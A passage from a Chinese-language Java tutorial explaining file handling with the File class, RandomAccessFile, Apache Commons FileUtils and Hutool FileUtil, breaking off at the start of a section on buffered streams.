类是专门对文件进行操作的类，注意只能对文件本身进行操作，不能对文件内容进行操作，想要操作内容，必须借助输入输出流。</p><h3 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 文件路径名</span></span><br><span class="line"><span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/Users/username/123.txt&quot;</span>;</span><br><span class="line"><span class="type">File</span> <span class="variable">file1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path);</span><br><span class="line"><span class="comment">// 文件路径名</span></span><br><span class="line"><span class="type">String</span> <span class="variable">path2</span> <span class="operator">=</span> <span class="string">&quot;/Users/username/1/2.txt&quot;</span>;</span><br><span class="line"><span class="type">File</span> <span class="variable">file2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path2); -------------相当于/Users/username/<span class="number">1</span>/<span class="number">2.</span>txt</span><br><span class="line"><span class="comment">// 通过父路径和子路径字符串</span></span><br><span class="line"><span class="type">String</span> <span class="variable">parent</span> <span class="operator">=</span> <span class="string">&quot;/Users/username/aaa&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">child</span> <span class="operator">=</span> <span class="string">&quot;bbb.txt&quot;</span>;</span><br><span class="line"><span class="type">File</span> <span class="variable">file3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(parent, child); --------相当于/Users/username/aaa/bbb.txt</span><br><span class="line"><span class="comment">// 通过父级File对象和子路径字符串</span></span><br><span class="line"><span class="type">File</span> <span class="variable">parentDir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/Users/username/aaa&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">child</span> <span class="operator">=</span> <span class="string">&quot;bbb.txt&quot;</span>;</span><br><span class="line"><span class="type">File</span> <span class="variable">file4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(parentDir, child); --------相当于/Users/username/aaa/bbb.txt</span><br></pre></td></tr></table></figure><ol><li>一个 File 对象代表硬盘中实际存在的一个文件或者目录。</li><li>File 类的构造方法不会检验这个文件或目录是否真实存在，因此无论该路径下是否存在文件或者目录，都不影响 File 对象的创建。</li></ol><h3 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h3><p>File 的常用方法主要分为获取功能、获取绝对路径和相对路径、判断功能、创建删除功能的方法。</p><ol><li>获取功能的方法<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/Users/username/aaa/bbb.java&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;文件绝对路径:&quot;</span>+f.getAbsolutePath());</span><br><span class="line">System.out.println(<span class="string">&quot;文件构造路径:&quot;</span>+f.getPath());</span><br><span class="line">System.out.println(<span class="string">&quot;文件名称:&quot;</span>+f.getName());</span><br><span class="line">System.out.println(<span class="string">&quot;文件长度:&quot;</span>+f.length()+<span class="string">&quot;字节&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">File</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/Users/username/aaa&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;目录绝对路径:&quot;</span>+f2.getAbsolutePath());</span><br><span class="line">System.out.println(<span class="string">&quot;目录构造路径:&quot;</span>+f2.getPath());</span><br><span class="line">System.out.println(<span class="string">&quot;目录名称:&quot;</span>+f2.getName());</span><br><span class="line">System.out.println(<span class="string">&quot;目录长度:&quot;</span>+f2.length());</span><br></pre></td></tr></table></figure></li><li>绝对路径和相对路径<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 绝对路径示例</span></span><br><span class="line"><span class="type">File</span> <span class="variable">absoluteFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/Users/username/example/test.txt&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;绝对路径：&quot;</span> + absoluteFile.getAbsolutePath());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 相对路径示例</span></span><br><span class="line"><span class="type">File</span> <span class="variable">relativeFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;example/test.txt&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;相对路径：&quot;</span> + relativeFile.getPath());</span><br></pre></td></tr></table></figure></li><li>判断功能的方法<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/Users/username/example&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断文件或目录是否存在</span></span><br><span class="line"><span class="keyword">if</span> (file.exists()) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;文件或目录存在&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;文件或目录不存在&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否是目录</span></span><br><span class="line"><span class="keyword">if</span> (file.isDirectory()) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;是目录&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;不是目录&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否是文件</span></span><br><span class="line"><span class="keyword">if</span> (file.isFile()) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;是文件&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;不是文件&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>创建、删除功能的方法<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建文件</span></span><br><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/Users/username/example/test.txt&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (file.createNewFile()) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;创建文件成功：&quot;</span> + file.getAbsolutePath());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;创建文件失败：&quot;</span> + file.getAbsolutePath());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除文件</span></span><br><span class="line"><span class="keyword">if</span> (file.delete()) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;删除文件成功：&quot;</span> + file.getAbsolutePath());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;删除文件失败：&quot;</span> + file.getAbsolutePath());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建多级目录</span></span><br><span class="line"><span class="type">File</span> <span class="variable">directory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/Users/username/example/subdir1/subdir2&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (directory.mkdirs()) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;创建目录成功：&quot;</span> + directory.getAbsolutePath());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;创建目录失败：&quot;</span> + directory.getAbsolutePath());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>遍历目录<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">directory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/Users/itwanger/Documents/Github/paicoding&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 列出目录下的文件名</span></span><br><span class="line">String[] files = directory.list();</span><br><span class="line">System.out.println(<span class="string">&quot;目录下的文件名：&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (String file : files) &#123;</span><br><span class="line">    System.out.println(file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 列出目录下的文件和子目录</span></span><br><span class="line">File[] filesAndDirs = directory.listFiles();</span><br><span class="line">System.out.println(<span class="string">&quot;目录下的文件和子目录：&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (File fileOrDir : filesAndDirs) &#123;</span><br><span class="line">    <span class="keyword">if</span> (fileOrDir.isFile()) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;文件：&quot;</span> + fileOrDir.getName());</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fileOrDir.isDirectory()) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;目录：&quot;</span> + fileOrDir.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>递归遍历<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">File</span> <span class="variable">directory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/Users/itwanger/Documents/Github/paicoding&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 递归遍历目录下的文件和子目录</span></span><br><span class="line">    traverseDirectory(directory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">traverseDirectory</span><span class="params">(File directory)</span> &#123;</span><br><span class="line">    <span class="comment">// 列出目录下的所有文件和子目录</span></span><br><span class="line">    File[] filesAndDirs = directory.listFiles();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历每个文件和子目录</span></span><br><span class="line">    <span class="keyword">for</span> (File fileOrDir : filesAndDirs) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fileOrDir.isFile()) &#123;</span><br><span class="line">            <span class="comment">// 如果是文件，输出文件名</span></span><br><span class="line">            System.out.println(<span class="string">&quot;文件：&quot;</span> + fileOrDir.getName());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fileOrDir.isDirectory()) &#123;</span><br><span class="line">            <span class="comment">// 如果是目录，递归遍历子目录</span></span><br><span class="line">            System.out.println(<span class="string">&quot;目录：&quot;</span> + fileOrDir.getName());</span><br><span class="line">            traverseDirectory(fileOrDir);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="RandomAccessFile"><a href="#RandomAccessFile" class="headerlink" title="RandomAccessFile"></a>RandomAccessFile</h3><p>RandomAccessFile 是 Java 中一个非常特殊的类，它既可以用来读取文件，也可以用来写入文件。与其他 IO 类（如 FileInputStream 和 FileOutputStream）不同，RandomAccessFile 允许您跳转到文件的任何位置，从那里开始读取或写入。这使得它特别适用于需要在文件中随机访问数据的场景，如数据库系统。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.RandomAccessFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RandomAccessFileDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> <span class="string">&quot;logs/javabetter/itwanger.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 使用 RandomAccessFile 写入文件</span></span><br><span class="line">            writeToFile(filePath, <span class="string">&quot;Hello, 沉默王二!&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 使用 RandomAccessFile 读取文件</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> readFromFile(filePath);</span><br><span class="line">            System.out.println(<span class="string">&quot;文件内容: &quot;</span> + content);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">writeToFile</span><span class="params">(String filePath, String content)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">RandomAccessFile</span> <span class="variable">randomAccessFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(filePath, <span class="string">&quot;rw&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 将文件指针移动到文件末尾（在此处追加内容）</span></span><br><span class="line">            randomAccessFile.seek(randomAccessFile.length());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 写入内容</span></span><br><span class="line">            randomAccessFile.writeUTF(content);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">readFromFile</span><span class="params">(String filePath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">content</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">RandomAccessFile</span> <span class="variable">randomAccessFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(filePath, <span class="string">&quot;r&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 将文件指针移动到文件开始处（从头开始读取）</span></span><br><span class="line">            randomAccessFile.seek(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            content.append(randomAccessFile.readUTF());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> content.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RandomAccessFile 主要有两个构造方法：</p><ul><li><code>RandomAccessFile(File file, String mode)</code>：使用给定的文件对象和访问模式创建一个新的 RandomAccessFile 实例。</li><li><code>RandomAccessFile(String name, String mode)</code>：使用给定的文件名和访问模式创建一个新的 RandomAccessFile 实例。</li></ul><p>访问模式 mode 的值可以是：</p><ul><li>“r”：以只读模式打开文件。调用结果对象的任何 write 方法都将导致 IOException。</li><li>“rw”：以读写模式打开文件。如果文件不存在，它将被创建。</li><li>“rws”：以读写模式打开文件，并要求对内容或元数据的每个更新都被立即写入到底层存储设备。这种模式是同步的，可以确保在系统崩溃时不会丢失数据。</li><li>“rwd”：与“rws”类似，以读写模式打开文件，但仅要求对文件内容的更新被立即写入。元数据可能会被延迟写入。</li></ul><p>主要方法</p><ul><li><code>long getFilePointer()</code>：返回文件指针的当前位置。</li><li><code>long length()</code>：返回此文件的长度。</li><li><code>int read()</code>：从该文件中读取一个字节数据。</li><li><code>int read(byte[] b)</code>：从该文件中读取字节数据并将其存储到指定的字节数组中。</li><li><code>int read(byte[] b, int off, int len)</code>：从该文件中读取字节数据并将其存储到指定的字节数组中，从偏移量 off 开始，最多读取 len 个字节。</li><li><code>String readLine()</code>：从该文件中读取一行文本。</li><li><code>readUTF()</code>：从文件读取 UTF-8 编码的字符串。此方法首先读取两个字节的长度信息，然后根据这个长度读取字符串的 UTF-8 字节。最后，这些字节被转换为 Java 字符串。这意味着当你使用 readUTF 方法读取字符串时，需要确保文件中的字符串是使用 writeUTF 方法写入的，这样它们之间的长度信息和编码方式才能保持一致。</li><li><code>void seek(long pos)</code>：将文件指针设置到文件中的 pos 位置。</li><li><code>void write(byte[] b)</code>：将指定的字节数组的所有字节写入该文件。</li><li><code>void write(byte[] b, int off, int len)</code>：将指定字节数组的部分字节写入该文件，从偏移量 off 开始，写入 len 个字节。</li><li><code>void write(int b)</code>：将指定的字节写入该文件。</li><li><code>writeUTF(String str)</code>：将一个字符串以 UTF-8 编码写入文件。此方法首先写入两个字节的长度信息，表示字符串的 UTF-8 字节长度，然后写入 UTF-8 字节本身。因此，当你使用 writeUTF 写入字符串时，实际写入的字节数会比字符串的 UTF-8 字节长度多两个字节。这两个字节用于在读取字符串时确定正确的字符串长度。</li></ul><p>再来看一个示例，结合前面的讲解，就会彻底掌握 RandomAccessFile。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;logs/javabetter/itwanger.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> (<span class="type">RandomAccessFile</span> <span class="variable">raf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(file, <span class="string">&quot;rw&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">// 写入文件</span></span><br><span class="line">    raf.writeUTF(<span class="string">&quot;Hello, 沉默王二!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将文件指针移动到文件开头</span></span><br><span class="line">    raf.seek(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取文件内容</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> raf.readUTF();</span><br><span class="line">    System.out.println(<span class="string">&quot;内容: &quot;</span> + content);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Apache-FileUtils-类"><a href="#Apache-FileUtils-类" class="headerlink" title="Apache FileUtils 类"></a>Apache FileUtils 类</h3><p>FileUtils 类是 Apache Commons IO 库中的一个类，提供了一些更为方便的方法来操作文件或目录。</p><h4 id="1）复制文件或目录："><a href="#1）复制文件或目录：" class="headerlink" title="1）复制文件或目录："></a><strong>1）复制文件或目录：</strong></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">srcFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;path/to/src/file&quot;</span>);</span><br><span class="line"><span class="type">File</span> <span class="variable">destFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;path/to/dest/file&quot;</span>);</span><br><span class="line"><span class="comment">// 复制文件</span></span><br><span class="line">FileUtils.copyFile(srcFile, destFile);</span><br><span class="line"><span class="comment">// 复制目录</span></span><br><span class="line">FileUtils.copyDirectory(srcFile, destFile);</span><br></pre></td></tr></table></figure><h4 id="2）删除文件或目录："><a href="#2）删除文件或目录：" class="headerlink" title="2）删除文件或目录："></a><strong>2）删除文件或目录：</strong></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;path/to/file&quot;</span>);</span><br><span class="line"><span class="comment">// 删除文件或目录</span></span><br><span class="line">FileUtils.delete(file);</span><br></pre></td></tr></table></figure><p>需要注意的是，如果要删除一个非空目录，需要先删除目录中的所有文件和子目录。</p><h4 id="3）移动文件或目录："><a href="#3）移动文件或目录：" class="headerlink" title="3）移动文件或目录："></a><strong>3）移动文件或目录：</strong></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">srcFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;path/to/src/file&quot;</span>);</span><br><span class="line"><span class="type">File</span> <span class="variable">destFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;path/to/dest/file&quot;</span>);</span><br><span class="line"><span class="comment">// 移动文件或目录</span></span><br><span class="line">FileUtils.moveFile(srcFile, destFile);</span><br></pre></td></tr></table></figure><h4 id="4）查询文件或目录的信息："><a href="#4）查询文件或目录的信息：" class="headerlink" title="4）查询文件或目录的信息："></a><strong>4）查询文件或目录的信息：</strong></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;path/to/file&quot;</span>);</span><br><span class="line"><span class="comment">// 获取文件或目录的修改时间</span></span><br><span class="line"><span class="type">Date</span> <span class="variable">modifyTime</span> <span class="operator">=</span> FileUtils.lastModified(file);</span><br><span class="line"><span class="comment">// 获取文件或目录的大小</span></span><br><span class="line"><span class="type">long</span> <span class="variable">size</span> <span class="operator">=</span> FileUtils.sizeOf(file);</span><br><span class="line"><span class="comment">// 获取文件或目录的扩展名</span></span><br><span class="line"><span class="type">String</span> <span class="variable">extension</span> <span class="operator">=</span> FileUtils.getExtension(file.getName());</span><br></pre></td></tr></table></figure><h3 id="Hutool-FileUtil-类"><a href="#Hutool-FileUtil-类" class="headerlink" title="Hutool FileUtil 类"></a>Hutool FileUtil 类</h3><p>FileUtil 类是 <a href="https://hutool.cn/">Hutool</a> 工具包中的文件操作工具类，提供了一系列简单易用的文件操作方法，可以帮助 Java 开发者快速完成文件相关的操作任务。</p><p>FileUtil 类包含以下几类操作工具：</p><ul><li>文件操作：包括文件目录的新建、删除、复制、移动、改名等</li><li>文件判断：判断文件或目录是否非空，是否为目录，是否为文件等等。</li><li>绝对路径：针对 ClassPath 中的文件转换为绝对路径文件。</li><li>文件名：主文件名，扩展名的获取</li><li>读操作：包括 getReader、readXXX 操作</li><li>写操作：包括 getWriter、writeXXX 操作</li></ul><p>下面是 FileUtil 类中一些常用的方法：</p><p>1、copyFile：复制文件。该方法可以将指定的源文件复制到指定的目标文件中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">dest</span> <span class="operator">=</span> FileUtil.file(<span class="string">&quot;FileUtilDemo2.java&quot;</span>);</span><br><span class="line">FileUtil.copyFile(file, dest);</span><br></pre></td></tr></table></figure><p>2、move：移动文件或目录。该方法可以将指定的源文件或目录移动到指定的目标文件或目录中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FileUtil.move(file, dest, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>3、del：删除文件或目录。该方法可以删除指定的文件或目录，如果指定的文件或目录不存在，则会抛出异常。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FileUtil.del(file);</span><br></pre></td></tr></table></figure><p>4、rename：重命名文件或目录。该方法可以将指定的文件或目录重命名为指定的新名称。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FileUtil.rename(file, <span class="string">&quot;FileUtilDemo3.java&quot;</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>5、readLines：从文件中读取每一行数据。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FileUtil.readLines(file, <span class="string">&quot;UTF-8&quot;</span>).forEach(System.out::println);</span><br></pre></td></tr></table></figure><h2 id="Java-缓冲流"><a href="#Java-缓冲流" class="headerlink" title="Java 缓冲流"></a>Java 缓冲流</h2><p>Java 的缓冲流是对字节流和字符流的一种封装，通过在内存中开辟缓冲区来提高 I&#x2F;O 操作的效率。Java 通过 BufferedInputStream 和 BufferedOutputStream 来实现字节流的缓冲，通过 BufferedReader 和 BufferedWriter 来实现字符流的缓冲。</p><p>缓冲流的工作原理是将数据先写入缓冲区中，当缓冲区满时再一次性写入文件或输出流，或者当缓冲区为空时一次性从文件或输入流中读取一定量的数据。这样可以减少系统的 I&#x2F;O 操作次数，提高系统的 I&#x2F;O 效率，从而提高程序的运行效率。</p><h3 id="字节缓冲流"><a href="#字节缓冲流" class="headerlink" title="字节缓冲流"></a>字节缓冲流</h3><p>BufferedInputStream 和 BufferedOutputStream 属于字节缓冲流，强化了字节流 InputStream 和 OutputStream，关于字节流，我们前面已经详细地讲过了，可以<a href="https://javabetter.cn/io/stream.html">戳这个链接</a>去温习。</p><h4 id="1）构造方法"><a href="#1）构造方法" class="headerlink" 